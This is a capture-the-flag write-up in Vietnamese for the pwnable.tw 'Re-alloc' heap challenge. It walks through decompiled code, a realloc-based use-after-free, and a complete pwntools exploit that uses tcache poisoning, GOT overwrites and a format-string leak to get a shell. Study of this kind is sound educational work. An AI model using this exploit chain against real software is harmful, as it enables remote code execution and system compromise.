---
title:  "Pwnable.tw - Re-alloc"
date:   2025-03-25 10:00:00 +0700
header:
  teaser: "/assets/images/2025-03-25-pwntw-realloc/Screenshot 2025-03-25 172442.png"
tags:
  - pwnable.tw
  - elf
  - heap
  - use-after-free
  - tcache-poisoning
  - realloc
---

![Challenge description](/assets/images/2025-03-25-pwntw-realloc/Screenshot%202025-03-25%20172442.png){:class="img-responsive"}

## Phân tích
### Tổng quan
Challenge cho ta một elf binary cùng với libc phiên bản 2.29. RELRO và PIE tắt.  
![Checksec](/assets/images/2025-03-25-pwntw-realloc/Screenshot%202025-03-26%20120846.png){:class="img-responsive"}  
Chương trình có 4 chức năng:
1. Alloc 1 chunk có index, size và data được user chỉ định. Giá trị size phải nhỏ hơn 0x78 (Vừa với tcache).

```cpp
int allocate()
{
  _BYTE *v0; 
  unsigned __int64 v2; 
  unsigned __int64 size; 
  void *v4; 

  printf("Index:");
  v2 = read_long();
  if ( v2 > 1 || heap[v2] ) {
    LODWORD(v0) = puts("Invalid !");
  }
  else {
    printf("Size:");
    size = read_long();

    // tcache limit
    if ( size <= 0x78 ) { 
      v4 = realloc(0LL, size);

      // alloc thành công
      if ( v4 ) { 
        heap[v2] = v4;
        printf("Data:");
        v0 = (_BYTE *)(heap[v2] + read_input(heap[v2], (unsigned int)size));
        *v0 = 0;
      }
      else {
        LODWORD(v0) = puts("alloc error");
      }
    }
    else {
      LODWORD(v0) = puts("Too large!");
    }
  }
  return (int)v0;
}
```
2. Re-alloc 1 chunk đã được alloc trước đó với size và data mới.

```cpp
int reallocate() {
  unsigned __int64 v1; 
  unsigned __int64 size; 
  void *v3; 

  printf("Index:");
  v1 = read_long();
  if ( v1 > 1 || !heap[v1] )
    return puts("Invalid !");
  printf("Size:");
  size = read_long();
  if ( size > 0x78 )
    return puts("Too large!");
  v3 = realloc((void *)heap[v1], size);
  if ( !v3 )
    return puts("alloc error");
  heap[v1] = v3;
  printf("Data:");
  return read_input(heap[v1], (unsigned int)size);
}
```
3. Free 1 chunk có index được user chỉ định. Sau khi free có đặt lại pointer về null nên sẽ không có lỗi ở đây.

```cpp
int rfree() {
  void *v0; 
  unsigned __int64 v2; 

  printf("Index:");
  v2 = read_long();
  if ( v2 > 1 ) {
    LODWORD(v0) = puts("Invalid !");
  }
  else {
    realloc(*((void **)&heap + v2), 0LL);
    v0 = &heap;
    *((_QWORD *)&heap + v2) = 0LL;
  }
  return (int)v0;
}
```
4. Thoát chương trình.

Ngoài ra, chương trình chỉ cho phép 2 chunk tồn tại đồng thời (index là 0 hoặc 1), việc này được kiểm soát bởi global array **heap**.
### Hiểu về hàm realloc
Điều đáng chú ý ở challenge này là nó dùng hàm realloc để thực hiện cả 3 thao tác chính. Dựa theo [man page](https://man7.org/linux/man-pages/man3/realloc.3p.html) và [source code](https://elixir.bootlin.com/glibc/glibc-2.29/source/malloc/memusage.c#L379) của realloc:
1. realloc(NULL, size): giống như malloc.
2. realloc(ptr, size): dealloc (không phải free) chunk cũ và alloc 1 chunk mới với size mới với data giống với chunk cũ, độ dài của data phù hợp với chunk nhỏ hơn. Nếu size mới bằng size cũ thì realloc không làm gì cả.
3. realloc(ptr, 0): giống như free.

Dựa vào những điều trên, ta xác định được lỗi use-after-free ở chức năng thứ 2 của chương trình do không kiểm tra size được nhập bởi user.  
## Khai thác
Với hạn chế size của mọi chunk phải ở trong vùng tcache thì ý tưởng khai thác chính của ta sẽ là dùng kỹ thuật tcache-poisoning.  
Các bước khai thác:
1. Ghi đè got_atoll thành plt_printf (chọn atoll do ta có thể kiểm soát hoàn toàn tham số của nó).
2. Leak libc base bằng lỗi format-string vừa tạo ra.
3. Vẫn dùng lỗi format-string, ghi đè tất cả các giá trị trong mảng **heap** về null nhằm tránh lỗi khi alloc về sau.
4. Ghi đè got_atoll thành system, thao tác tương tự bước 1 (lưu ý printf trả về số kí tự được in thành công)
5. Lấy shell

```python
#!/usr/bin/python3
from pwn import *

context.binary = elf = ELF("./re-alloc_patched", checksec = False)
libc = ELF("./libc.so.6", checksec = False)

# con = process()
con = remote("chall.pwnable.tw", 10106)

def debug_from_here():
    gdb.attach(con, gdbscript = '''
        b*main+0x6f
        b*main+0x7b
        b*main+0x87
    ''')
    input()

def alloc(idx, size, data):
    con.sendlineafter(b"Your choice: ", b"1")
    con.sendlineafter(b"Index:", idx)
    con.sendlineafter(b"Size:", size)
    con.sendlineafter(b"Data:", data)

def realloc(idx, size, data):
    con.sendlineafter(b"Your choice: ", b"2")
    con.sendlineafter(b"Index:", idx)
    con.sendlineafter(b"Size:", size)
    if (size != b"0" and size != b"\0"):
        con.sendlineafter(b"Data:", data)
    
def free(idx):
    con.sendlineafter(b"Your choice: ", b"3")
    con.sendlineafter(b"Index:", idx)

### Stage 1: overwrite got_atoll -> plt_printf
alloc(b"0", f"{0x10}", b"abcd0")                # heap[0] = p1
realloc(b"0", b"0", "")                         # heap[0] = p1; tcache[0x20] = [p1]
realloc(b"0", f"{0x10}", p64(elf.got['atoll'])) # heap[0] = p1; tcache[0x20] = [p1 -> atoll_got -> ...]
alloc(b"1", f"{0x10}", b"abcd1")                # heap[0] = p1, heap[1] = p1; tcache[0x20] = [atoll_got -> ...]

realloc(b"1", f"{0x20}", b"abcd1")              # heap[0] = p1, heap[1] = p2; tcache[0x20] = [atoll_got -> ...]
free(b'1')                                      # heap[0] = p1, heap[1] = 0; tcache[0x20] = [atoll_got -> ...], tcache[0x30] = [p2]
alloc(b"1", f"{0x10}", p64(elf.plt['printf']))  # heap[0] = p1, heap[1] = atoll_got; tcache[0x20] = [...], tcache[0x30] = [p2]

### Stage 2: leak libc base
free(b"%7$p")
libc.address = int(con.recvline().strip(b"\n"), 16) - 0x1e5760
log.success(hex(libc.address))

### Stage 3: clear heap array
free(b"%9$n".ljust(8) + p64(elf.sym['heap']))
free(b"%9$n".ljust(8) + p64(elf.sym['heap'] + 8))

### Stage 4: overwrite got_atoll -> system
alloc(b"\0", f"%{0x2f}c", b"abcd0")                  # heap[0] = p1
realloc(b"\0", b"\0", b"")                           # heap[0] = p1; tcache[0x40] = [p1]
realloc(b"\0", f"%{0x2f}c", p64(elf.got['atoll']))   # heap[0] = p1; tcache[0x40] = [p1 -> atoll_got -> ...]
alloc(b"1\0", f"%{0x2f}c", b"abcd1")                 # heap[0] = p1, heap[1] = p1; tcache[0x40] = [atoll_got -> ...]

realloc(b"1\0", f"%{0x3f}c", b"abcd1")               # heap[0] = p1, heap[1] = p2; tcache[0x40] = [atoll_got -> ...]
free(b'1\0')                                         # heap[0] = p1, heap[1] = 0; tcache[0x40] = [atoll_got -> ...], tcache[0x50] = [p2]
alloc(b"1\0", f"%{0x2f}c", p64(libc.sym['system']))  # heap[0] = p1, heap[1] = atoll_got; tcache[0x40] = [...], tcache[0x50] = [p2]

### Stage 5: get shell
free(b"/bin/sh")

con.interactive()

```
![Solved](/assets/images/2025-03-25-pwntw-realloc/Screenshot%202025-03-26%20120324.png){:class="img-responsive"}
